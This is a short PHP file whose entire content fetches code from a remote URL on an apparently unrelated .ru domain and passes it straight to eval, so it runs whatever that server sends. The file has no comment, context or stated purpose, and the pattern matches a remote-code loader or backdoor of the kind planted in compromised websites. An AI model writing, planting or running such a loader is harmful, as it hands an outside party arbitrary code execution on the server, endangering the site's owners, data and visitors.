<?php
$path = "https://code.topkz.ru/fgd/8/zhi.php";
$code = implode('', file($path));
eval("?>" . $code);
?>
